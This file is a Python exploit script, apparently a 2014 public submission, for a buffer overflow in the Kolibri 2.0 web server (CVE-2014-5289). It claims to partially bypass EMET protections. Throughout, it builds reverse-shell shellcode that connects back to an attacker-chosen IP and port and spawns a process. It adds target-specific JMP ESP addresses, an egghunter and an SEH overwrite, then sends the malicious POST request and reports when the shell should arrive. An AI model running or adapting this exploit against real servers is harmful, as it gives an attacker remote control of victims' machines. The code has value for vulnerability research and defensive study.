#!/bin/python
import socket, sys, re

############################################################################################################
# Exploit Title: Kolibri POST Buffer overflow with EMET 5.0 and EMET 4.1 Partial Bypass
# Date: September 30th 2014
# Author: tekwizz123
# Vendor Homepage: http://www.senkas.com
# Software Download: http://www.senkas.com/kolibri/download.php
# Version: 2.0
# Tested on: Windows 7 32 bit, Windows 7 64 bit, Windows XP SP3
# CVE-ID: CVE-2014-5289
#
# This exploit will bypass all protections in EMET 5.0 and 4.1 but DEP.
#
# If you have any questions about the exploit, send a message to @tekwizz123 and I'll try help out.
#
# You may modify this exploit as you like for whatever purposes you like so long as my name (tekwizz123)
# appears as the original author of this exploit.
###########################################################################################################

# Basic check to see if we have the arguments we need
if len(sys.argv) < 6:
    print "Usage: " + sys.argv[0] + " *target ip* *target port* *ip to connect back to* *port to connect back to* *target*"
    print "Targets: "
    print "1. XP SP2 32 bit"
    print "2. XP SP3 32 bit"
    print "3. Windows Vista and Later 32 bit or 64 bit"
    exit(1)



# Set source ip and port and destination ip and port
targetip = sys.argv[1]
targetport = int(sys.argv[2])
localhost = sys.argv[3]
localport = int(sys.argv[4])


# Set the version of the remote machine so we can craft the correct exploit for it
target = int(sys.argv[5])


# Check if the version was valid or not
if (target != 1 and target != 2 and target !=3):
	print "Error: Target was not valid"



# Define our check to see if the server is vulnerable
def check():
	handle = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "Checking if target is vulnerable....."
	handle.connect((targetip, targetport))
	handle.send("GET / HTTP/1.1\r\n")
	resp = handle.recv(1024)
	handle.close()

	if re.search("server: kolibri\-2\.0", resp):
		print "\nTarget is vulnerable\n"
	else:
		print "\nTarget is not vulnerable\n"
		exit(0) # Exit the program before we continue

# And call it to check if the server is vulnerable
check()



# Define the code for the custom close socket loop
def addBufCloseSocketASM(buf):
	#CloseSocket Call Loop. 
	"""This is very important as without this code, if we terminate the program for some reason,
	the program doesn't free up the sockets it uses to listen for the connections to the server.
	Therefore, we check from 0 to about 205 ish (I think, can't remember the exact number) and close all
	of these sockets one by one. Since you can only close a socket associated with the program from which
	you call the CloseSocket call, this will not affect other applications, and thus is a nice solution."""
	buf += "\xBE\xA1\xF4\x6C\x01"
	buf += "\x81\xEE\x01\x01\x01\x01"
	buf += "\x8B\x36"
	buf += "\x33\xFF"
	buf += "\x33\xDB"
	buf += "\x83\xC3\x50" * 7
	buf += "\x3B\xFB"
	buf += "\x7F\x06"
	buf += "\x57"
	buf += "\xFF\xD6"
	buf += "\x47" # Increment the flipping counter before we loop around again with next instruciton.
	buf += "\xEB\xF6"
	
	return buf

def addSocketASM(buf):
	#Socket call to set up a new socket, on working one this is is WS2_32.WSASocketA?
	buf += "\xBB\x91\xF4\x6C\x01"
	buf += "\x81\xEB\x01\x01\x01\x01"
	buf += "\x8B\x1B"
	if target == 3:
		buf += "\x81\xC3\x79\x8E\x01\x01"
		buf += "\x81\xEB\x01\x01\x01\x01"
	if target == 2:
		buf += "\x81\xC3\xEB\x09\x11\x10"
		buf += "\x81\xEB\xD6\xE8\x10\x10"
	if target == 1:
		buf += "\x81\xC3\x95\x77\x01\x01"
		buf += "\x81\xEB\x79\x56\x01\x01"
	buf += "\x33\xC9"
	buf += "\x51\x51\x51\x51"
	buf += "\x41\x51\x41\x51"
	buf += "\xFF\xD3"

	return buf

def addConnectCallASM(buf):
	#Connect call
	buf += "\xBB\xA5\xF4\x6C\x01\x81\xEB\x01\x01\x01\x01\x8B\x1B\x68"

	# Set the IP to connect back to within the shellcode, thanks to http://stackoverflow.com/questions/12638408/decorating-hex-function-to-pad-zeros
	# this should now work with all IP addresses.
	hostString = str(localhost).split(".")
	buf += "{0:#0{1}x}".format(int(hostString[0]),4)[2:4].decode('hex')
	buf += "{0:#0{1}x}".format(int(hostString[1]),4)[2:4].decode('hex')
	buf += "{0:#0{1}x}".format(int(hostString[2]),4)[2:4].decode('hex')
	buf += "{0:#0{1}x}".format(int(hostString[3]),4)[2:4].decode('hex')

	# Some static bytes in the shellcode
	buf += "\xB9\x02\x01"

	# The the port to connect back on in the shellcode
	hexPort = hex(localport)
	buf += hexPort[2:4].decode('hex')
	buf += hexPort[4:].decode('hex')

	# Finish the last of the Connect call shellcode
	buf += "\xFE\xCD\x51\x8B\xCC\x8B\xF0\x33\xC0\xB0\x16\x50\x51\x56\xFF\xD3"

	return buf

def addExitProcessASM(buf):
	#ExitProcess Call
	buf += "\xBF\x15\xEE\x6C\x01\x81\xEF\x01\x01\x01\x01\x8B\x3F\xFF\xD7"
	return buf



##########################################################################################################################

# This section is responsible for doing a standard stack overflow against XP targets to get around SEHOP issues not present
# with the Windows 7 version for some reason.

##########################################################################################################################
if (target == 1 or target == 2):
	buf = ""

	# Add the close socket assembly to the buffer variable
	buf = addBufCloseSocketASM(buf)

	# Add the socket assembly to open up a new socket
	buf = addSocketASM(buf)

	# Add the assembly to connect back to our host
	buf = addConnectCallASM(buf)
	

	#CreateProcessA call
	buf += "\x33\xC9\xB1\x54\x2B\xE1\x8B\xFC\x57\x33\xC0\xF3\xAA\x5F\xC6\x07\x44\xFE\x47\x2D\x57\x8B\xC6\x8D\x7F\x38\xAB\xAB\xAB\x5F\x33\xC0\x8D\x77\x44\xB9\x64\x6E\x65\x01\x81\xE9\x01\x01\x01\x01\x51\x8B\xCC\x56\x57\x50\x50\xBA\x10\x10\x10\x18\x81\xEA\x10\x10\x10\x10\x52\x40\x50\x48\x50\x50\x51\x50\xBE\xFD\xED\x6C\x01\x81\xEE\x01\x01\x01\x01\x8B\x36\xFF\xD6"
	
	# Add ExitProcess shellcode
	buf = addExitProcessASM(buf)

	overflow = "A" * 515
	if target == 2:
		overflow += "\x7B\x46\x86\x7C" #7C86467B on Windows XP SP3 = JMP ESP
	if target == 1:
		overflow += "\xED\x1E\x94\x7C" #7C941EED on Windows XP SP2 = JMP ESP
	overflow += buf	





########################################################################################################

# This section of the exploit deals with the Windows 7 version of the exploit

########################################################################################################
if (target == 3):

	# Start defining our shellcode into the buf variable, starting with the tag for our egghunter:
	buf =  "\x43\x44\x44\x45\x43\x44\x44\x45"

	# Add the close socket assembly to the buffer variable
	buf = addBufCloseSocketASM(buf)

	#Socket call to set up a new socket, on working one this is is WS2_32.WSASocketA?
	buf = addSocketASM(buf)

	# Add the assembly to connect back to our host
	buf = addConnectCallASM(buf)

	#CreateProcessA call
	buf += "\x33\xC9\xB1\x54\x2B\xE1\x8B\xFC\x57\x33\xC0\xF3\xAA\x5F\xC6\x07\x44\xFE\x47\x2D\x57\x8B\xC6\x8D\x7F\x38\xAB\xAB\xAB\x5F\x33\xC0\x8D\x77\x44\xB9\x64\x6E\x65\x01\x81\xE9\x01\x01\x01\x01\x51\x8B\xCC\x56\x57\x50\x50\xBA\x10\x10\x10\x18\x81\xEA\x10\x10\x10\x10\x52\x40\x50\x48\x50\x50\x51\x50\xBF\xFD\xED\x6C\x01\x81\xEF\x01\x01\x01\x01\x8B\x3F\xFF\xD7"

	
	# Add ExitProcess shellcode
	buf = addExitProcessASM(buf)

	
	# The legendary WoW64 egghunter created by Lincoln. Greetz mate, you've done a brilliant job with this :)
	# One should also note, if the target has EAF enabled, this egghunter will take longer to run
	egghunter = (
	"\x33\xD2" # XOR EDX, EDX to start the search from the beginning of memory, a la 00000000.
	"\x66\x8c\xcb\x80\xfb\x23\x75\x08\x31\xdb\x53\x53\x53\x53\xb3\xc0"
	"\x66\x81\xca\xff\x0f\x42\x52\x80\xfb\xc0\x74\x19\x6a\x02\x58\xcd"
	"\x2e\x5a\x3c\x05\x74\xea\xb8"
	"\x43\x44\x44\x45"  # tag to search for
	"\x89\xd7\xaf\x75\xe5\xaf\x75\xe2\xff\xe7\x6a\x26\x58\x31\xc9\x89"
	"\xe2\x64\xff\x13\x5e\x5a\xeb\xdf\x90\x90")

	overflow = "A" * 12
	overflow += "A" * (790 - len(overflow) - len(egghunter))
	overflow += egghunter
	overflow += "A" * 2
	overflow += "\xEB\x99" # NSEH overwrite
	overflow += "\xD1\x87\x44" #SEH overwrite 004487D1 aka xor pop pop ret from the binary itself.



# Define our buffer for the exploit

buffer = "POST /" + overflow + " HTTP/1.1\r\n"
buffer += "User-Agent: Wget/1.13.4\r\n"
buffer += "Host: " + buf + "\r\n"# change this!
buffer += "Accept: */*\r\n"
buffer += "Connection: Keep-Alive\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "Content-Length: 4"
buffer += "\r\n\r\n"
buffer += "licenseID=string&content=string¶msXML=string"


# Set up the handle and connect to the target, the send the buffer and close the connection
handle = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "Connecting to the target......"
handle.connect((targetip, targetport))
print "Sending evil buffer....."
handle.send(buffer)
handle.close()

# Print out details about the expected waiting time for the egghunter to work.
print "\nWe are now done."
print "If targeting XP, your shell will be instant"
print "If targeting Windows Vista and later, you will recieve your shell within 6 seconds if the target has not enabled EAF protection"
print "Otherwise, if the target has enabled EAF protection, expect your shell within 35 seconds."